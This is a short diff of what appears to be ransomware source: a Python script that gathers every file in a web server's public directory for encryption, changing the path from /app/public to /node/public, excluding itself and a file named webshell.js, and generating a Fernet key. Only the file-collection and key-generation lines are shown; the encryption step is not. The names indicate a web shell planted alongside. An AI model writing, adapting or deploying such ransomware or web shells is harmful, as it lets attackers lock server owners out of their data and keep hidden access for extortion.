@@ -3,9 +3,9 @@ from cryptography.fernet import Fernet
 
 files = []
 
-for file in os.listdir('/app/public'):
+for file in os.listdir('/node/public'):
   if file != "ransomware.py" and file != "webshell.js":
-    files.append('/app/public/' + file)
+    files.append('/node/public/' + file)
 
 key = Fernet.generate_key()
 
